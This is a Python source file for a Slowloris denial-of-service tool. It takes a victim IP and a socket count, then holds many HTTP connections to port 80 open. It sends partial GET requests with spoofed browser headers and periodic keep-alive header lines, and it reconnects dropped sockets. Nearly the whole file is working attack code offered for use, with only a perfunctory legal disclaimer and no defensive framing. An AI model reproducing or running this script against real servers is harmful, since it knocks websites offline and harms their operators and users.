#Importing modules
import socket
import random
import time
import sys
import os

#Setting up a list to keep all the sockets documented
list_of_sockets = []

# A fake header to fool the victim
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

# Pretty self explanatory
def banner():
    print("""
-----------------------------------------------
|---------------------------------------------|
|            SLOW LORIS DOS SCRIPT            |
|---------------------------------------------|
| # Author: IVBecy                            |
|                                             |
| # Your IP is visible                        |
|                                             |
| # It is the end user's responsibility       |
|  to obey all applicable laws.               |
|                                             |
|---------------------------------------------|
-----------------------------------------------

        """)

# If somone gets the terminal commands wrong this message will get displayed, to help them
def usage():
    print('''\n

    Usage:

    py slowloris-v1.py [-ip]  [-sc]  [-t]

    -ip : The IP address of the victim
    -sc : The number of connections you want to make to the Target
    -t : Refresh time (in sec)
    ''')
    sys.exit()

#Taking all the arguments form the terminal, and assigning them to variables
if sys.argv[1] != "-ip":
    usage()

if len(sys.argv) < 2:
    usage()
    if sys.argv[1] != "-ip":
        usage()

ip = sys.argv[2]

if sys.argv[3] != "-sc":
    usage()

socket_count = sys.argv[4]

if sys.argv[5] != "-t":
    usage()

times = sys.argv[6]

#Detecting OS, for deleting terminal ("clear" for Linux/Mac, "cls" for windows)
if sys.platform == "win32":
    ops = "cls"
else:
    ops = "clear"

#Setting up the start screen + displaying information about the attack
banner()
#getting start time
start = time.ctime()
#Printing the info
print("Target: {} ||  Sockets: {} || Start: {}".format(ip, socket_count, start))
time.sleep(5)
print("Creating sockets...")

#Setting up all the sockets
for _ in range(int(socket_count)):
    try:
        print("Target: {} ||  Sockets: {} || Start: {}".format(ip, socket_count, start))
        print("\n")
        print("Sockets: {}".format(_))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, 80))
        os.system(ops)
    # If there is a time out error, notify user, and keep connecting
    except socket.error:
        break
    list_of_sockets.append(s)


print("Setting up the sockets...")
#Sending keep data to the victim
for s in list_of_sockets:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send(bytes("{}\r\n".format(header).encode("utf-8")))

# Main Operation
while True:
    print("Sending keep-alive headers...")
    time.sleep(1)
    os.system(ops)
    print("Target: {} ||  Sockets: {} ".format(ip, socket_count), end="")
    #If there are less item in the list, then the given amount of connections, keep connecting until
    #the goal is reached
    while len(list_of_sockets) < int(socket_count):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, 80))
        list_of_sockets.append(s)
        print("Sockets Dropped to",len(list_of_sockets))
        print("Remaking sockets...")
        print("")
        if len(list_of_sockets) ==  int(socket_count):
            print("")
    if len(list_of_sockets) ==  int(socket_count):
        print("")

    print("Number of sockets alive: ",len(list_of_sockets))
    #Keeping the connections alive
    for s in list_of_sockets:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))#sending data to the server
        #If there is a time out, remove a connection from the list
        except socket.error:
            list_of_sockets.remove(s)
            #When a connection is removed, try to make a new one
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                list_of_sockets.append(s)
                #Sending data from all the sockets
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in regular_headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            #If no connections could be made, start the loop again
            except socket.error:
                continue

    time.sleep(int(times))
